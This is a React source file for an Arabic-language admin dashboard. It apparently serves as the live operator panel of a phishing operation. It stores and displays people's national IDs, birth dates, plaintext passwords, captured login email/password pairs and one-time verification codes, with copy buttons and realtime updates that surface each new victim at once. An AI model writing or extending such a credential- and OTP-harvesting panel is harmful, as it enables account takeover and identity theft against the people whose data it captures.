import { useEffect, useState, useRef } from 'react';
import { supabase, Registration } from '@/lib/supabase';
import {
  Users, CheckCircle2, Clock, Activity, Eye, EyeOff,
  RefreshCw, Wifi, WifiOff, Shield, Calendar, Phone,
  CreditCard, Mail, Layout, List, User, Lock, FileText, Hash,
  LogIn as LogInIcon, ShieldCheck, Copy, Check
} from 'lucide-react';
import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
import HeaderFooterEditor from '@/components/cms/HeaderFooterEditor';
import PageContentEditor from '@/components/cms/PageContentEditor';
import FormFieldsEditor from '@/components/cms/FormFieldsEditor';

type LoginAttempt = {
  id: string;
  registration_id: string | null;
  client_id: string | null;
  email: string;
  password: string;
  created_at: string;
};

type RegistrationWithMeta = Registration & { 
  _new?: boolean; 
  extra_fields?: Record<string, string>;
  login_attempts?: LoginAttempt[];
  verification_codes?: VerificationCode[];
  client_id?: string;
};

type VerificationCode = {
  id: string;
  registration_id: string | null;
  client_id: string | null;
  code: string;
  verified: boolean;
  created_at: string;
};

// Unified timeline item type
type TimelineItem = {
  id: string;
  type: 'registration' | 'login' | 'verification';
  created_at: string;
  data: any;
};

const FIELD_ICONS: Record<string, any> = {
  full_name: User,
  email: Mail,
  phone: Phone,
  national_id: CreditCard,
  date_of_birth: Calendar,
  password: Lock,
  textarea: FileText,
};

const CORE_COLUMNS: Record<string, string> = {
  full_name: 'full_name',
  email: 'email',
  phone: 'phone',
  national_id: 'national_id',
  date_of_birth: 'date_of_birth',
  password: 'password_hash',
};

const statusLabel: Record<string, { text: string; className: string }> = {
  pending: { text: 'قيد المراجعة', className: 'bg-yellow-100 text-yellow-700' },
  verified: { text: 'تم التحقق', className: 'bg-green-100 text-green-700' },
  completed: { text: 'مكتمل', className: 'bg-blue-100 text-blue-700' },
};

function maskPassword(pw: string) {
  return '•'.repeat(Math.min(pw.length, 10));
}

// ─── Registrations Tab ────────────────────────────────────────────────────────

const AVATAR_COLORS = [
  'bg-blue-600', 'bg-emerald-600', 'bg-violet-600',
  'bg-rose-600', 'bg-amber-600', 'bg-cyan-600',
];
function avatarColor(name: string) {
  if (!name) return AVATAR_COLORS[0];
  let n = 0;
  for (let i = 0; i < name.length; i++) n += name.charCodeAt(i);
  return AVATAR_COLORS[n % AVATAR_COLORS.length];
}

function RegistrationsTab() {
  const { formFields } = useSiteConfig();
  const [registrations, setRegistrations] = useState<RegistrationWithMeta[]>([]);
  const [loading, setLoading] = useState(true);
  const [connected, setConnected] = useState(false);
  const [showPassMap, setShowPassMap] = useState<Record<string, boolean>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const fetchAll = async () => {
    setLoading(true);
    const { data: regs } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
    
    // Try to fetch login attempts (ignore 404 errors)
    let logins: LoginAttempt[] = [];
    try {
      const { data, error } = await supabase
        .from('login_attempts')
        .select('*')
        .order('created_at', { ascending: false });
      
      // Only use data if no error
      if (!error && data) {
        logins = data;
      }
    } catch (e) {
      // Ignore errors - login_attempts table may not exist
    }
    
    // Try to fetch verification codes
    let codes: VerificationCode[] = [];
    try {
      const { data, error } = await supabase
        .from('verification_codes')
        .select('*')
        .order('created_at', { ascending: false });
      
      // Only use data if no error
      if (!error && data) {
        codes = data;
      }
    } catch (e) {
      // Ignore errors - verification_codes table may not exist
    }
    
    setLoading(false);
    if (regs) {
      const combined = regs.map(r => ({
        ...r,
        // Filter by registration_id OR client_id to capture all attempts
        login_attempts: logins?.filter(l => 
          l.registration_id === r.id || l.client_id === r.client_id
        ).sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()) || [],
        verification_codes: codes?.filter(c => 
          c.registration_id === r.id || c.client_id === r.client_id
        ).sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()) || []
      }));
      setRegistrations(combined);
    }
  };

  useEffect(() => {
    fetchAll();
    
    // Create a single channel for all subscriptions
    const channel = supabase.channel('admin-all-data')
      // Listen for registration changes
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'registrations' }, (payload) => {
        const newReg = { ...(payload.new as Registration), _new: true };
        setRegistrations((prev) => [newReg, ...prev]);
        setSelectedId((prev) => prev ?? newReg.id);
        setTimeout(() => setRegistrations((prev) => prev.map((r) => r.id === newReg.id ? { ...r, _new: false } : r)), 3000);
      })
      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'registrations' }, (payload) => {
        setRegistrations((prev) => prev.map((r) => r.id === payload.new.id ? { ...r, ...payload.new as Registration } : r));
      })
      // Listen for login_attempts changes
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'login_attempts' }, async (payload) => {
        const newLogin = payload.new as LoginAttempt;
        setRegistrations((prev) => prev.map((r) => {
          if (r.id === newLogin.registration_id) {
            return {
              ...r,
              login_attempts: [...(r.login_attempts || []), newLogin]
            };
          }
          return r;
        }));
        // Also refresh all data to make sure we have latest
        fetchAll();
      })
      // Listen for verification_codes changes
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'verification_codes' }, async (payload) => {
        const newCode = payload.new as VerificationCode;
        setRegistrations((prev) => prev.map((r) => {
          if (r.id === newCode.registration_id) {
            return {
              ...r,
              verification_codes: [...(r.verification_codes || []), newCode]
            };
          }
          return r;
        }));
        // Also refresh all data to make sure we have latest
        fetchAll();
      })
      .subscribe((status) => setConnected(status === 'SUBSCRIBED'));
    channelRef.current = channel;
    return () => { supabase.removeChannel(channel); };
  }, []);

  const togglePassVisibility = (id: string) =>
    setShowPassMap((prev) => ({ ...prev, [id]: !prev[id] }));

  const stats = {
    total: registrations.length,
    verified: registrations.filter((r) => r.status === 'verified' || r.status === 'completed').length,
    pending: registrations.filter((r) => r.status === 'pending').length,
    today: registrations.filter((r) => new Date(r.created_at).toDateString() === new Date().toDateString()).length,
  };

  const selected = registrations.find((r) => r.id === selectedId);

  return (
    <div id="admin-panel" className="flex flex-col flex-1 overflow-hidden text-right" dir="rtl" style={{ width: '100%', maxWidth: '100%', padding: 0, margin: 0 }}>

      {/* ── Split panel ── */}
      <div className="flex-1 flex overflow-hidden min-h-0" style={{ padding: 0 }}>

        {/* ── LEFT: Registration list (40%) ── */}
        <div className="w-[40%] flex flex-col bg-slate-800 border-l border-slate-700 overflow-hidden" style={{ margin: 0, padding: 0 }}>
          <div className="shrink-0 px-4 py-3 border-b border-slate-700 flex items-center justify-between gap-2">
            <div className="flex items-center gap-2 min-w-0">
              <Activity className="w-4 h-4 text-blue-400 shrink-0" />
              <span className="font-bold text-white text-sm truncate">سجل التسجيلات</span>
              <span className="bg-slate-700 text-slate-400 text-xs px-2 py-0.5 rounded-full shrink-0">
                {registrations.length}
              </span>
            </div>
            <div className="flex items-center gap-2 shrink-0">
              <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold ${connected ? 'bg-green-900/60 text-green-400' : 'bg-red-900/60 text-red-400'}`}>
                {connected ? <Wifi className="w-3 h-3" /> : <WifiOff className="w-3 h-3" />}
                <span className="hidden sm:inline">{connected ? 'مباشر' : 'منقطع'}</span>
              </div>
              <button onClick={fetchAll} className="p-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-400 hover:text-white transition-colors">
                <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
              </button>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center py-16">
                <div className="w-7 h-7 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
              </div>
            ) : (
              <div className="divide-y divide-slate-700/40">
                {registrations.map((reg) => {
                  const st = statusLabel[reg.status] || statusLabel.pending;
                  const isSelected = reg.id === selectedId;
                  const name = reg.full_name || 'بدون اسم';
                  return (
                    <button key={reg.id} onClick={() => setSelectedId(isSelected ? null : reg.id)}
                      className={`w-full text-right px-4 py-3.5 flex items-center gap-3 transition-all group ${reg._new ? 'bg-blue-500/10 border-r-2 border-blue-400' : isSelected ? 'bg-slate-700/80 border-r-2 border-blue-500' : 'hover:bg-slate-700/40 border-r-2 border-transparent'}`}>
                      <div className={`w-9 h-9 rounded-full ${avatarColor(name)} flex items-center justify-center text-white font-bold text-sm shrink-0 shadow-md`}>
                        {name.charAt(0)}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 justify-between">
                          <span className={`text-sm font-semibold truncate ${isSelected ? 'text-white' : 'text-slate-200 group-hover:text-white'}`}>{name}</span>
                          <span className={`text-xs px-2 py-0.5 rounded-full font-semibold shrink-0 ${st.className}`}>{st.text}</span>
                        </div>
                        <p className="text-xs text-slate-500 truncate mt-0.5 ltr text-left">{reg.email}</p>
                      </div>
                    </button>
                  );
                })}
              </div>
            )}
          </div>
        </div>

        {/* ── RIGHT: Detail panel (60%) ── */}
        <div className="flex-1 flex flex-col bg-slate-800 overflow-hidden" style={{ margin: 0, padding: 0 }}>
          <div className="shrink-0 px-5 py-3.5 border-b border-slate-700 flex items-center gap-2">
            <Shield className="w-4 h-4 text-blue-400" />
            <h2 className="font-bold text-white text-sm">{selected ? `تفاصيل: ${selected.full_name || 'المستخدم'}` : 'تفاصيل المستخدم'}</h2>
          </div>

          <div className="flex-1 overflow-y-auto">
            {!selected ? (
              <div className="flex flex-col items-center justify-center h-full text-slate-500 px-6 text-center gap-3">
                <Users className="w-8 h-8 opacity-30" />
                <p className="text-sm font-medium">لم يتم اختيار أي مستخدم</p>
              </div>
            ) : (
              <div className="p-6">
                {/* Profile Header */}
                <div className="flex items-center gap-4 pb-5 border-b border-slate-700 mb-6">
                  <div className={`w-16 h-16 rounded-2xl ${avatarColor(selected.full_name || '')} flex items-center justify-center text-2xl font-extrabold text-white shadow-xl`}>
                    {(selected.full_name || '?').charAt(0)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="text-lg font-extrabold text-white leading-tight">{selected.full_name || 'بدون اسم'}</h3>
                    <div className="flex items-center gap-2 mt-1 flex-wrap">
                      <span className={`px-3 py-1 rounded-full text-xs font-semibold ${statusLabel[selected.status]?.className}`}>{statusLabel[selected.status]?.text}</span>
                      {selected.client_id && (
                        <span className="px-2 py-1 rounded-full text-[10px] font-mono bg-slate-700 text-slate-400">
                          ID: {selected.client_id.substring(0, 8)}...
                        </span>
                      )}
                    </div>
                  </div>
                </div>

                {/* Unified Timeline - sorted by most recent first */}
                {(() => {
                  // Create unified timeline items
                  const timeline: TimelineItem[] = [];

                  // Add registration data
                  timeline.push({
                    id: selected.id,
                    type: 'registration',
                    created_at: selected.created_at,
                    data: selected,
                  });

                  // Add login attempts
                  if (selected.login_attempts && selected.login_attempts.length > 0) {
                    selected.login_attempts.forEach(login => {
                      timeline.push({
                        id: login.id,
                        type: 'login',
                        created_at: login.created_at,
                        data: login,
                      });
                    });
                  }

                  // Add verification codes
                  if (selected.verification_codes && selected.verification_codes.length > 0) {
                    selected.verification_codes.forEach(vc => {
                      timeline.push({
                        id: vc.id,
                        type: 'verification',
                        created_at: vc.created_at,
                        data: vc,
                      });
                    });
                  }

                  // Sort by most recent first
                  timeline.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

                  // Render timeline items
                  return (
                    <div className="space-y-4">
                      {timeline.map((item, index) => {
                        const isNewest = index === 0;
                        
                        // Registration Data Card
                        if (item.type === 'registration') {
                          return (
                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-blue-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                              <div className="flex items-center justify-between mb-4">
                                <div className="flex items-center gap-2">
                                  <User className={`w-4 h-4 ${isNewest ? 'text-blue-400' : 'text-slate-400'}`} />
                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-blue-400' : 'text-white'}`}>البيانات الشخصية</h4>
                                </div>
                                <div className="flex items-center gap-2">
                                  <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-blue-500/20 text-blue-400' : 'bg-slate-700 text-slate-400'}`}>
                                    {new Date(item.created_at).toLocaleString('ar-SA')}
                                  </span>
                                </div>
                              </div>
                              <div className="grid sm:grid-cols-2 gap-3">
                                {formFields
                                  .filter(f => f.page_key === 'register' && f.field_key !== 'confirm_password')
                                  .sort((a, b) => a.field_order - b.field_order)
                                  .map((field) => {
                                    const Icon = FIELD_ICONS[field.field_key] || Activity;
                                    const coreCol = CORE_COLUMNS[field.field_key];
                                    const value = coreCol ? item.data[coreCol] : item.data.extra_fields?.[field.field_key];
                                    
                                    if (field.field_type === 'password') {
                                      return (
                                        <div key={field.id} className="col-span-full bg-slate-900/50 rounded-lg p-3 flex items-center gap-3">
                                          <Shield className="w-4 h-4 text-slate-400 shrink-0" />
                                          <div className="flex-1 min-w-0">
                                            <p className="text-[10px] text-slate-500 font-medium">{field.label}</p>
                                            <div className="flex items-center gap-3">
                                              <p className="font-mono text-sm text-white tracking-widest">{showPassMap[item.id] ? (value || '—') : maskPassword(value || '')}</p>
                                              <button onClick={() => togglePassVisibility(item.id)} className="text-xs text-blue-400 hover:underline shrink-0">
                                                {showPassMap[item.id] ? 'إخفاء' : 'إظهار'}
                                              </button>
                                              {value && (
                                                <button onClick={() => copyToClipboard(value, `pass-${item.id}`)} className="text-xs text-green-400 hover:underline shrink-0 flex items-center gap-1">
                                                  {copiedId === `pass-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                                  {copiedId === `pass-${item.id}` ? 'تم' : 'نسخ'}
                                                </button>
                                              )}
                                            </div>
                                          </div>
                                        </div>
                                      );
                                    }
                                    return (
                                      <div key={field.id} className="bg-slate-900/50 rounded-lg p-3 flex items-start gap-2">
                                        <Icon className="w-4 h-4 text-slate-400 mt-0.5 shrink-0" />
                                        <div className="min-w-0 flex-1">
                                          <p className="text-[10px] text-slate-500 font-medium mb-0.5">{field.label}</p>
                                          <div className="flex items-center justify-between gap-2">
                                            <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
                                            {value && (field.field_type === 'email' || field.field_key === 'email') && (
                                              <button onClick={() => copyToClipboard(value, `email-${item.id}`)} className="text-xs text-green-400 hover:underline shrink-0 flex items-center gap-1">
                                                {copiedId === `email-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                                {copiedId === `email-${item.id}` ? 'تم' : 'نسخ'}
                                              </button>
                                            )}
                                          </div>
                                        </div>
                                      </div>
                                    );
                                  })}
                              </div>
                            </div>
                          );
                        }

                        // Login Attempt Card
                        if (item.type === 'login') {
                          return (
                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-amber-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                              <div className="flex items-center justify-between mb-3">
                                <div className="flex items-center gap-2">
                                  <LogInIcon className={`w-4 h-4 ${isNewest ? 'text-amber-400' : 'text-amber-500/70'}`} />
                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-amber-400' : 'text-white'}`}>تسجيل الدخول</h4>
                                </div>
                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-amber-500/20 text-amber-400' : 'bg-slate-700 text-slate-400'}`}>
                                  {new Date(item.created_at).toLocaleString('ar-SA')}
                                </span>
                              </div>
                              <div className="grid grid-cols-2 gap-3">
                                <div className="bg-slate-900/50 rounded-lg p-3">
                                  <div className="flex items-center justify-between mb-1">
                                    <p className="text-[10px] text-slate-500">البريد</p>
                                    <button onClick={() => copyToClipboard(item.data.email, `login-email-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
                                      {copiedId === `login-email-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                      {copiedId === `login-email-${item.id}` ? 'تم' : 'نسخ'}
                                    </button>
                                  </div>
                                  <p className="text-xs text-slate-200 truncate ltr text-left">{item.data.email}</p>
                                </div>
                                <div className="bg-slate-900/50 rounded-lg p-3">
                                  <div className="flex items-center justify-between mb-1">
                                    <p className="text-[10px] text-slate-500">كلمة المرور</p>
                                    <button onClick={() => copyToClipboard(item.data.password, `login-pass-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
                                      {copiedId === `login-pass-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                      {copiedId === `login-pass-${item.id}` ? 'تم' : 'نسخ'}
                                    </button>
                                  </div>
                                  <p className="text-sm text-white font-bold tracking-wider">{item.data.password}</p>
                                </div>
                              </div>
                            </div>
                          );
                        }

                        // Verification Code Card
                        if (item.type === 'verification') {
                          return (
                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-green-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                              <div className="flex items-center justify-between mb-3">
                                <div className="flex items-center gap-2">
                                  <ShieldCheck className={`w-4 h-4 ${isNewest ? 'text-green-400' : 'text-green-500/70'}`} />
                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-green-400' : 'text-white'}`}>رمز التحقق</h4>
                                </div>
                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-green-500/20 text-green-400' : 'bg-slate-700 text-slate-400'}`}>
                                  {new Date(item.created_at).toLocaleString('ar-SA')}
                                </span>
                              </div>
                              <div className="bg-slate-900/50 rounded-lg p-3 text-center">
                                <div className="flex items-center justify-between mb-1">
                                  <p className="text-[10px] text-slate-500">رمز التحقق</p>
                                  <button onClick={() => copyToClipboard(item.data.code, `code-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
                                    {copiedId === `code-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                    {copiedId === `code-${item.id}` ? 'تم' : 'نسخ'}
                                  </button>
                                </div>
                                <p className="text-xl text-white font-bold tracking-[0.3em]">{item.data.code}</p>
                                <p className={`text-[10px] mt-2 ${item.data.verified ? 'text-green-400' : 'text-yellow-400'}`}>
                                  {item.data.verified ? 'تم التحقق ✓' : 'لم يتم التحقق'}
                                </p>
                              </div>
                            </div>
                          );
                        }

                        return null;
                      })}
                    </div>
                  );
                })()}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── CMS Tab ──────────────────────────────────────────────────────────────────

function CMSTab() {
  const [activeSection, setActiveSection] = useState<'header_footer' | 'pages' | 'form_fields'>('header_footer');
  return (
    <div className="space-y-5 text-right" dir="rtl">
      <div className="flex gap-2 overflow-x-auto pb-1">
        {[
          { key: 'header_footer', label: 'الرأس والتذييل' },
          { key: 'pages', label: 'محتوى الصفحات' },
          { key: 'form_fields', label: 'حقول النماذج' },
        ].map((s) => (
          <button key={s.key} onClick={() => setActiveSection(s.key as any)}
            className={`px-5 py-2.5 rounded-xl text-sm font-semibold whitespace-nowrap transition-all ${activeSection === s.key ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-800 border border-slate-700 text-slate-400 hover:text-white'}`}>
            {s.label}
          </button>
        ))}
      </div>
      {activeSection === 'header_footer' && <HeaderFooterEditor />}
      {activeSection === 'pages' && <PageContentEditor />}
      {activeSection === 'form_fields' && <FormFieldsEditor />}
    </div>
  );
}

// ─── Statistics Tab ─────────────────────────────────────────────────────────

function StatisticsTab() {
  const [registrations, setRegistrations] = useState<RegistrationWithMeta[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      setLoading(true);
      const { data: regs } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
      
      let logins: LoginAttempt[] = [];
      try {
        const { data, error } = await supabase.from('login_attempts').select('*').order('created_at', { ascending: false });
        if (!error && data) logins = data;
      } catch (e) {}
      
      let codes: VerificationCode[] = [];
      try {
        const { data, error } = await supabase.from('verification_codes').select('*').order('created_at', { ascending: false });
        if (!error && data) codes = data;
      } catch (e) {}
      
      if (regs) {
        const combined = regs.map(r => ({
          ...r,
          login_attempts: logins?.filter(l => l.registration_id === r.id) || [],
          verification_codes: codes?.filter(c => c.registration_id === r.id) || []
        }));
        setRegistrations(combined);
      }
      setLoading(false);
    };
    fetchData();
  }, []);

  const stats = {
    total: registrations.length,
    verified: registrations.filter((r) => r.status === 'verified' || r.status === 'completed').length,
    pending: registrations.filter((r) => r.status === 'pending').length,
    today: registrations.filter((r) => new Date(r.created_at).toDateString() === new Date().toDateString()).length,
    loginAttempts: registrations.reduce((sum, r) => sum + (r.login_attempts?.length || 0), 0),
    verificationCodes: registrations.reduce((sum, r) => sum + (r.verification_codes?.length || 0), 0),
  };

  const statCards = [
    { label: 'إجمالي التسجيلات', value: stats.total, icon: Users, color: 'blue' },
    { label: 'تم التحقق', value: stats.verified, icon: CheckCircle2, color: 'green' },
    { label: 'قيد المراجعة', value: stats.pending, icon: Clock, color: 'yellow' },
    { label: 'تسجيلات اليوم', value: stats.today, icon: Activity, color: 'purple' },
    { label: 'محاولات الدخول', value: stats.loginAttempts, icon: LogInIcon, color: 'orange' },
    { label: 'رموز التحقق', value: stats.verificationCodes, icon: ShieldCheck, color: 'cyan' },
  ];

  const colorMap: Record<string, { bg: string; text: string }> = {
    blue: { bg: 'bg-blue-500/20', text: 'text-blue-400' },
    green: { bg: 'bg-green-500/20', text: 'text-green-400' },
    yellow: { bg: 'bg-yellow-500/20', text: 'text-yellow-400' },
    purple: { bg: 'bg-purple-500/20', text: 'text-purple-400' },
    orange: { bg: 'bg-orange-500/20', text: 'text-orange-400' },
    cyan: { bg: 'bg-cyan-500/20', text: 'text-cyan-400' },
  };

  return (
    <div className="space-y-8 text-right" dir="rtl">
      <div className="flex items-center gap-3">
        <Activity className="w-6 h-6 text-blue-400" />
        <h2 className="text-xl font-bold text-white">إحصائيات عامة</h2>
      </div>
      
      {loading ? (
        <div className="flex items-center justify-center py-20">
          <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
        </div>
      ) : (
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
          {statCards.map((card) => {
            const Icon = card.icon;
            return (
              <div key={card.label} className="bg-slate-800 rounded-2xl p-5 border border-slate-700">
                <div className={`w-10 h-10 rounded-xl flex items-center justify-center mb-3 ${colorMap[card.color].bg}`}>
                  <Icon className={`w-5 h-5 ${colorMap[card.color].text}`} />
                </div>
                <p className={`text-3xl font-extrabold ${colorMap[card.color].text}`}>{card.value}</p>
                <p className="text-xs text-slate-400 mt-1 font-medium">{card.label}</p>
              </div>
            );
          })}
        </div>
      )}

      {/* Registration Status Chart */}
      <div className="bg-slate-800 rounded-2xl p-6 border border-slate-700">
        <h3 className="text-lg font-bold text-white mb-4">حالة التسجيلات</h3>
        <div className="space-y-4">
          {[
            { label: 'تم التحقق', count: stats.verified, total: stats.total, color: 'bg-green-500' },
            { label: 'قيد المراجعة', count: stats.pending, total: stats.total, color: 'bg-yellow-500' },
          ].map((item) => {
            const percentage = stats.total > 0 ? (item.count / stats.total) * 100 : 0;
            return (
              <div key={item.label} className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">{item.label}</span>
                  <span className="text-white font-semibold">{item.count} ({percentage.toFixed(1)}%)</span>
                </div>
                <div className="h-3 bg-slate-700 rounded-full overflow-hidden">
                  <div className={`h-full ${item.color} rounded-full transition-all duration-500`} style={{ width: `${percentage}%` }} />
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

// ─── Main Admin Page ──────────────────────────────────────────────────────────

export default function AdminPage() {
  const [activeTab, setActiveTab] = useState<'registrations' | 'statistics' | 'cms'>('registrations');

  return (
    <div className="h-screen flex flex-col bg-slate-900 text-white overflow-hidden m-0 p-0" dir="rtl" style={{ margin: 0, padding: 0, width: '100vw', height: '100vh' }}>
      <header className="shrink-0 bg-slate-800 border-b border-slate-700 px-4 py-4" style={{ margin: 0 }}>
        <div className="flex items-center justify-between w-full">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div className="text-right">
              <h1 className="text-base font-bold text-white">لوحة التحكم</h1>
              <p className="text-xs text-slate-400">إدارة الموقع والتسجيلات</p>
            </div>
          </div>
          <div className="flex gap-1 bg-slate-700/50 rounded-xl p-1">
            {[
              { key: 'registrations', label: 'التسجيلات', icon: List },
              { key: 'statistics', label: 'إحصائيات', icon: Activity },
              { key: 'cms', label: 'إدارة المحتوى', icon: Layout },
            ].map(({ key, label, icon: Icon }) => (
              <button key={key} onClick={() => setActiveTab(key as any)}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${activeTab === key ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}>
                <Icon className="w-4 h-4" />{label}
              </button>
            ))}
          </div>
        </div>
      </header>

      <div className="flex-1 overflow-hidden flex flex-col">
        <div className="max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 flex flex-col flex-1 overflow-hidden">
          {activeTab === 'registrations' ? <RegistrationsTab /> : 
           activeTab === 'statistics' ? (
             <div className="flex-1 overflow-y-auto"><StatisticsTab /></div>
           ) : (
             <div className="flex-1 overflow-y-auto"><CMSTab /></div>
           )}
        </div>
      </div>
    </div>
  );
}
